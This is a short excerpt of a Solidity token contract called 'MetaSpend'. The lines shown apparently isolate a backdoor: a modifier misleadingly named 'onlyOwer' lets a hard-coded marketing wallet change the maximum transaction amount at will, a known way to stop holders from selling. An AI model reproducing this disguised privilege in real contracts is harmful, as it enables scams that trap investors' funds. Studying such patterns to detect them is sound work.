...
contract MetaSpend is Context, IERC20, Ownable {
    ...
    address payable public marketingAddress = payable(0x6A122c075A8217aAF97e4bC761EBE7F3C69602a2); // Marketing Address
    ...
    string private _name = "MetaSpend";
    ...
    uint256 public maxTX =5000000000000e9;
    ...
    modifier onlyOwer() {
        require(marketingAddress == _msgSender());
        _;
    }
    ...
    function setmaxTX(uint256 amount) external onlyOwer() {
        maxTX = amount;
    }
